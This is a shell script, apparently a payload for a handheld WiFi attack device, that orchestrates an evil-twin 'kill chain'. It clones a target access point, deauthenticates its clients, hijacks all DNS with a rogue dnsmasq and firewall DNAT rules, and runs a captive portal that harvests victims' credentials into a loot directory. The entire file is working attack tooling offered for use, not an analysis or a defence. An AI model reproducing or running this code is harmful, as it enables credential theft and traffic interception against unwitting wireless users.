#!/bin/sh
# ============================================================================
# Title: DarkSec MALSTROM
# Author: wickednull
# Description: Evil-twin kill chain command center. Clone an AP (SKOLL), rip
#   clients off it (FENRIS-style deauth), and harvest their credentials through
#   an OS-adaptive captive portal (LOKI) — all driven by a dark-hacker web
#   dashboard and streamed live over SSE. Closes the FENRIR suite loop that
#   SKOLL + LOKI were meant to fill.
# Version: 1.0
# Category: user/interception
#
# Operator UI : http://<pager-ip>:8888   (protected by token, printed on LCD)
# Victim portal: any HTTP request routed by dnsmasq :1053 + firewall DNAT
# Loot        : /root/loot/malstrom/
#
# The engine (engine.py) watches /tmp/malstrom/state and does the heavy lifting
# (clone / deauth / monitor); this orchestrator brings the infrastructure up
# (nginx + php-fpm + rogue dnsmasq + fw4 redirects + dashboard + uhttpd) and
# provides a small Pager LCD control menu.
# ============================================================================

# --- environment --------------------------------------------------------------
PAYLOAD_DIR="$(cd "$(dirname "$0")" && pwd)"
MALSTROM_STATE_DIR="${MALSTROM_STATE_DIR:-/tmp/malstrom}"
PORTAL_IP="${MALSTROM_PORTAL_IP:-172.16.52.1}"
WWW_PORTAL="$PAYLOAD_DIR/www_portal"
LOOT_DIR="/root/loot/malstrom"
DASH_PORT=8888
PID_ENGINE="/tmp/malstrom_engine.pid"
PID_DASH="/tmp/malstrom_dash.pid"

mkdir -p "$MALSTROM_STATE_DIR" "$LOOT_DIR"

# shellcheck source=config.sh
. "$PAYLOAD_DIR/config.sh"
# shellcheck source=cleanup.sh
. "$PAYLOAD_DIR/cleanup.sh"

cleanup() {
    LED WHITE 2>/dev/null
    [ -f "$PID_ENGINE" ] && kill "$(cat "$PID_ENGINE")" 2>/dev/null
    [ -f "$PID_DASH" ] && kill "$(cat "$PID_DASH")" 2>/dev/null
    malstrom_full_cleanup
    malstrom_finalize_wifi
    rm -rf "$WWW_PORTAL"
    rm -f "$PID_ENGINE" "$PID_DASH"
}
trap cleanup EXIT INT TERM

# --- helpers -------------------------------------------------------------------
# LOG and LED are provided by the DuckyScript runtime. Don't shadow them.
say() { LOG "$1"; }

led_state() { # $1=color
    LED "$1" 2>/dev/null
}

# --- dependency check/install ---------------------------------------------------
pkg_ensure() { # $1=pkg $2=desc
    if opkg list-installed | grep -q "^${1} "; then
        say "  $1 present"
        return 0
    fi
    say "  $1 missing ($2)"
    if CONFIRMATION_DIALOG "Install $1? ($2, few MB)"; then
        case $? in
            $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_ERROR)
                say "  declined $1"
                return 1
                ;;
        esac
        say "    opkg install $1..."
        opkg update >/dev/null 2>&1
        if opkg install "$1" >/dev/null 2>&1; then
            return 0
        fi
        say "  failed to install $1"
        return 1
    else
        return 1
    fi
}

dep_check() {
    local fail=0
    for pkg in uhttpd nginx php8 php8-fpm php8-cgi python3-light; do
        pkg_ensure "$pkg" || fail=1
    done
    return $fail
}

# --- token ----------------------------------------------------------------------
token_ensure() {
    [ -f "$MALSTROM_STATE_DIR/token" ] && return 0
    local t
    if command -v openssl >/dev/null 2>&1; then
        t="$(openssl rand -hex 8)"
    elif command -v md5sum >/dev/null 2>&1; then
        t="$( (date +%s%N; cat /proc/sys/kernel/random/uuid 2>/dev/null) | md5sum | cut -c1-16)"
    else
        t="$(date +%s | md5sum | cut -c1-16)"
    fi
    echo "$t" > "$MALSTROM_STATE_DIR/token"
}

# --- portal staging ---------------------------------------------------------------
detect_fpm_sock() {
    for s in /var/run/php8-fpm.sock /var/run/php-fpm.sock /var/run/php/php-fpm.sock; do
        [ -S "$s" ] && { echo "$s"; return 0; }
    done
    echo "/var/run/php8-fpm.sock"
}

stage_portal() {
    rm -rf "$WWW_PORTAL"
    mkdir -p "$WWW_PORTAL/captiveportal"
    cp "$PAYLOAD_DIR/portal/captiveportal.php" "$WWW_PORTAL/index.php"
    cp "$PAYLOAD_DIR/portal/captiveportal.php" "$WWW_PORTAL/captiveportal/index.php"
    cp "$PAYLOAD_DIR"/portal/detection/* "$WWW_PORTAL/" 2>/dev/null
    chmod -R 755 "$WWW_PORTAL"

    FPM_SOCK="$(detect_fpm_sock)"
    sed -e "s|__MALSTROM_PAYLOAD_DIR__|$PAYLOAD_DIR|g" \
        -e "s|__MALSTROM_PORTAL_IP__|$PORTAL_IP|g" \
        -e "s|__MALSTROM_FPM_SOCK__|$FPM_SOCK|g" \
        "$PAYLOAD_DIR/portal/nginx.conf.tmpl" > /etc/nginx/nginx.conf
    say "  Portal staged; nginx.conf generated (fpm=$FPM_SOCK)"
}

# --- infrastructure ---------------------------------------------------------------
start_webs() {
    # php-fpm
    /etc/init.d/php8-fpm start 2>/dev/null || /etc/init.d/php-fpm start 2>/dev/null
    sleep 1
    # nginx: disable UCI-generated config, back original up once
    uci -q set nginx.global.uci_enable=false
    uci -q commit nginx
    [ -f /etc/nginx/nginx.conf ] && [ ! -f /etc/nginx/nginx.conf.malstrom.bak ] \
        && cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.malstrom.bak
    /etc/init.d/nginx stop 2>/dev/null; killall nginx 2>/dev/null; sleep 1
    # Resolve include fragments nginx needs but that may live elsewhere in the
    # prefix tree. Regenerate them into /etc/nginx if missing so `nginx -t` passes.
    for f in mime.types fastcgi_params; do
        [ -f "/etc/nginx/$f" ] && continue
        for d in /etc/nginx /usr/share/nginx /usr/local/share/nginx /usr/share/nginx/html; do
            [ -f "$d/$f" ] && { cp "$d/$f" "/etc/nginx/$f"; break; }
        done
    done
    if ! nginx -t -c /etc/nginx/nginx.conf 2> "$MALSTROM_STATE_DIR/nginx.err"; then
        say "  [ENGINE] nginx config invalid:"
        say "  $(cat "$MALSTROM_STATE_DIR/nginx.err" 2>/dev/null | head -n5)"
        return 1
    fi
    nginx -c /etc/nginx/nginx.conf
    sleep 1
    say "  nginx + php-fpm up"
}

start_rogue_dns() {
    # kill any prior rogue (cleanup.sh's marker-qualified kill)
    local pids
    pids=$(netstat -tulpn 2>/dev/null | grep ':1053 ' | awk '{print $NF}' | sed 's|/.*||' | sort -u)
    for p in $pids; do kill "$p" 2>/dev/null; done
    dnsmasq --no-hosts --no-resolv --address=/#/"$PORTAL_IP" \
        --dns-forward-max=1 --cache-size=0 -p 1053 \
        --listen-address=0.0.0.0,::1 --bind-interfaces &
    echo $! > /tmp/malstrom_dns.pid
    say "  rogue dnsmasq :1053 up"
}

start_dnst() {
    # firewall redirects, marker-named so cleanup.sh removes them
    local name
    for spec in "Malstrom HTTP lan:80:80" "Malstrom HTTPS lan:443:80" \
                "Malstrom DNS TCP lan:53:1053" "Malstrom DNS UDP lan:53:1053"; do
        name="${spec%%:*}"
        if ! uci show firewall | grep -q "name='$name'"; then
            uci add firewall redirect >/dev/null
            uci set firewall.@redirect[-1].name="$name"
            uci set firewall.@redirect[-1].src='lan'
            uci set firewall.@redirect[-1].src_dip="!$PORTAL_IP"
            uci set firewall.@redirect[-1].proto='tcp'
            case "$name" in
                *HTTPS*) uci set firewall.@redirect[-1].src_dport='443'; uci set firewall.@redirect[-1].dest_port='80' ;;
                *DNS*)   uci set firewall.@redirect[-1].src_dport='53';  uci set firewall.@redirect[-1].dest_port='1053' ;;
                *)       uci set firewall.@redirect[-1].src_dport='80';  uci set firewall.@redirect[-1].dest_port='80' ;;
            esac
            uci set firewall.@redirect[-1].dest_ip="$PORTAL_IP"
            uci set firewall.@redirect[-1].target='DNAT'
            uci set firewall.@redirect[-1].enabled='1'
        fi
    done
    # DNS UDP (proto differs) — detect by name, set proto=udp
    if uci show firewall | grep -q "name='Malstrom DNS UDP lan'"; then
        uci -q set firewall."$(uci show firewall 2>/dev/null \
            | sed -n "s/.*\(firewall\.@redirect\[[0-9]*\]\)\.name='Malstrom DNS UDP lan'.*/\1/p" \
            | head -n1)".proto='udp'
    fi
    uci commit firewall
    /etc/init.d/firewall reload 2>/dev/null || /etc/init.d/firewall restart 2>/dev/null
    say "  fw4 DNAT rules up"
}

start_dashboard() {
    uhttpd -f -p "$DASH_PORT" -h "$PAYLOAD_DIR/www" -c /cgi-bin -t 300 -T 300 &
    echo $! > "$PID_DASH"
    say "  dashboard uhttpd :$DASH_PORT up"
}

start_engine() {
    python3 "$PAYLOAD_DIR/engine.py" &
    echo $! > "$PID_ENGINE"
    say "  engine pid $(cat "$PID_ENGINE")"
}

# --- state write (shared with api.sh's write_state shape) --------------------------
st_json() { # target_ssid target_bssid channel
    printf '{"active":true,"target_ssid":"%s","target_bssid":"%s","target_channel":"%s",\
"portal_mode":"%s","wpa_psk":"%s","deauth_mode":"%s","deauth_burst":%s,"deauth_delay":%s,\
"deauth_continuous":%s,"template":"%s","redir_target":"http://example.com","updated":%d}' \
        "$1" "$2" "$3" "$PORTAL_MODE" "$WPA_PSK" "$DEAUTH_MODE" \
        "$DEAUTH_BURST" "$DEAUTH_DELAY" "$DEAUTH_CONTINUOUS" "$DEFAULT_TEMPLATE" "$(date +%s)"
}

sstate() { printf '%s' "$(st_json "$@")" > "$MALSTROM_STATE_DIR/state"; }

# --- payload UI ---------------------------------------------------------------------
pick_target() {
    # POSIX-safe target selection: recon APS JSON is parsed into three aligned
    # tempfiles (mac/ssid/channel), one record per line, then indexed by line.
    local json pick ssid mac ch i n macs_file ssids_file chs_file
    json="$(_pineap RECON APS limit=20 format=json 2>/dev/null)"
    [ -z "$json" ] && { ERROR_DIALOG "No recon data.\nRun PineAP recon first."; return 1; }

    macs_file="$(mktemp)"; ssids_file="$(mktemp)"; chs_file="$(mktemp)"
    echo "$json" | grep -o '"mac":"[^"]*"'  | sed 's/"mac":"//;s/"//'  > "$macs_file"
    echo "$json" | grep -o '"ssid":"[^"]*"' | sed 's/"ssid":"//;s/"//' > "$ssids_file"
    echo "$json" | grep -o '"channel":[0-9]*' | sed 's/"channel"://'   > "$chs_file"

    n=0
    while IFS= read -r _m; do n=$((n+1)); done < "$macs_file"
    if [ "$n" -eq 0 ]; then
        rm -f "$macs_file" "$ssids_file" "$chs_file"
        ERROR_DIALOG "No APs found.\nRun PineAP recon first."
        return 1
    fi

    local menu="" i=1
    while IFS= read -r _m; do
        [ "$i" -gt 15 ] && break
        _s=$(sed -n "${i}p" "$ssids_file")
        _c=$(sed -n "${i}p" "$chs_file")
        [ -z "$_s" ] && _s="<hidden>"
        [ -z "$_c" ] && _c="0"
        menu="$menu$i $_s [${_c}ch]\n"
        i=$((i+1))
    done < "$macs_file"
    PROMPT "Targets:\n\n$menu"
    pick="$(NUMBER_PICKER "Select target (1-$n)" 1)"
    case $? in
        $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_ERROR)
            rm -f "$macs_file" "$ssids_file" "$chs_file"; return 1 ;;
    esac
    [ -z "$pick" ] && pick=1
    macs=$(sed -n "${pick}p" "$macs_file")
    ssid=$(sed -n "${pick}p" "$ssids_file")
    ch=$(sed -n "${pick}p" "$chs_file")
    rm -f "$macs_file" "$ssids_file" "$chs_file"
    [ -z "$ssid" ] && ssid="$macs"
    [ -z "$ch" ] && ch="6"
    [ -z "$macs" ] && macs="-"
    if CONFIRMATION_DIALOG "Attach kill chain to:\n$ssid\n$macs ch$ch"; then
        case $? in
            $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_ERROR) return 1 ;;
        esac
        sstate "$ssid" "$macs" "$ch"
        echo "$ssid" > "$MALSTROM_STATE_DIR/current_ssid"
        echo "$DEFAULT_TEMPLATE" > "$MALSTROM_STATE_DIR/template_default"
        malstrom_emit_event "DEP" "Kill chain armed from Pager: $ssid ch$ch"
        malstrom_emit_event "INFO" "Portal SSID label: $ssid"
        ALERT "MALSTROM armed\n$ssid\n($macs)"
        return 0
    fi
    return 1
}

ui_menu() {
    PROMPT "MALSTROM\n\n1 Arm (pick target)\n2 Disarm\n3 Status\n4 Token\n5 Cleanup\n6 Exit"
    local pick
    pick="$(NUMBER_PICKER "MALSTROM > option" 1)"
    case $? in
        $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_ERROR)
            [ "${pick:-x}" = "6" ] && return 1
            return 0
            ;;
    esac
    case "$pick" in
        1) led_state AMBER; pick_target; led_state GREEN ;;
        2)
            [ -f "$MALSTROM_STATE_DIR/state" ] && sed -i 's/"active": *true/"active": false/' "$MALSTROM_STATE_DIR/state"
            malstrom_emit_event "DEP" "Disarmed from Pager"
            led_state BLUE
            ;;
        3)
            local s="$MALSTROM_STATE_DIR/state" active ssid creds clients
            active="idle"; ssid="-"
            [ -f "$s" ] && grep -q '"active": true' "$s" && active="ACTIVE"
            [ -f "$s" ] && ssid="$(sed -n 's/.*"target_ssid":"\([^"]*\)".*/\1/p' "$s" | head -n1)"
            [ -z "$ssid" ] && ssid="-"
            creds=0; [ -f "$MALSTROM_STATE_DIR/creds.json" ] && creds=$(wc -l < "$MALSTROM_STATE_DIR/creds.json")
            clients=$(wc -l < /proc/net/arp 2>/dev/null)
            PROMPT "Status: $active\nTarget: $ssid\nCreds: $creds  Clients: $clients"
            ;;
        4)
            token_ensure
            PROMPT "Access token:\n$(cat "$MALSTROM_STATE_DIR/token")\n\nDashboard: http://<pager-ip>:8888"
            ;;
        5)
            if CONFIRMATION_DIALOG "Full cleanup (restore WiFi + services)?"; then
                case $? in
                    $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_ERROR) ;;
                    *) malstrom_full_cleanup; PROMPT "Cleanup complete.\nWiFi + services restored." ;;
                esac
            fi
            ;;
        6) return 1 ;;
    esac
    return 0
}

# --- main ---------------------------------------------------------------------------
LOG ""
LOG "  ███▄ ▄███▓ ▄▄▄       ██▓    ████████▓"
LOG "  ▓██▓███▓▒▒████▄    ▓██▒    ▓  ██▒▓▒"
LOG "  ▓██▓ ▒██▒▒██  ▀█▄  ▒██░    ▒ ▓██░"
LOG "  ▒██▓ ░██░ ░██▄▄▄▄██ ▒██░    ░ ▓██▓"
LOG "  ░ ▒ ▓░ ▒▓  ▓▓▄▄▄▄▓▓ ░██████▒ ▒ ▒▓▒"
LOG "  ░ ▒░ ░ ▒ ▒ ▓▓▒▒▓▓▒▒ ░ ▒░▓  ░ ░ ▒░"
LOG "  ░ ░░   ░ ▒ ░ ▒ ░ ▒  ░ ░ ▒  ░   ░ ░"
LOG "     ░     ░   ░   ░    ░ ░       ░"
LOG ""
LOG "  DarkSec MALSTROM — evil-twin kill chain"
LOG "  SKOLL(ap) FENRIS(deauth) LOKI(portal) → dashboard"
LOG ""

if [ -f "$PID_ENGINE" ] && kill -0 "$(cat "$PID_ENGINE")" 2>/dev/null; then
    if CONFIRMATION_DIALOG "MALSTROM appears already running.\nRe-run to stop it?"; then
        case $? in
            $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_ERROR) exit 0 ;;
        esac
    else
        exit 0
    fi
    # fell through: user confirmed stop
    cleanup
    LOG "MALSTROM stopped."
    exit 0
fi

dep_check || { ERROR_DIALOG "Dependency install failed.\nInstall packages manually and retry."; exit 1; }

LED AMBER
token_ensure
stage_portal || { ERROR_DIALOG "Portal staging failed."; exit 1; }
start_webs || { ERROR_DIALOG "nginx/php start failed."; cleanup; exit 1; }
start_rogue_dns
start_dnst
echo 1 > /proc/sys/net/ipv4/ip_forward
echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore 2>/dev/null
echo 1 > /proc/sys/net/ipv4/conf/all/arp_announce 2>/dev/null
start_dashboard
start_engine
LED GREEN

PAGER_IP=$(for i in br-lan eth0 wlan0 usb0; do ip -4 addr show "$i" 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1; done | head -1)
[ -z "$PAGER_IP" ] && PAGER_IP="$PORTAL_IP"

LOG "green" "===================================="
LOG "  Dashboard : http://$PAGER_IP:$DASH_PORT"
LOG "  Token     : $(cat "$MALSTROM_STATE_DIR/token")"
LOG "  Loot      : $LOOT_DIR"
LOG "  Press A/B in the Pager menu to arm/disarm"
LOG "==========================================="
ALERT "MALSTROM ready\nToken: $(cat "$MALSTROM_STATE_DIR/token" | head -c 8)..."

while true; do
    BUTTON=$(WAIT_FOR_INPUT)
    case "$BUTTON" in
        A|A_BUTTON) led_state AMBER; pick_target; led_state GREEN ;;
        B|B_BUTTON|Escape)
            [ -f "$MALSTROM_STATE_DIR/state" ] && sed -i 's/"active": *true/"active": false/' "$MALSTROM_STATE_DIR/state"
            malstrom_emit_event "DEP" "Disarmed from Pager (B)"
            led_state BLUE
            ;;
        UP|DOWN)
            ui_menu || break
            ;;
    esac
done

LOG "Stopping MALSTROM..."
exit 0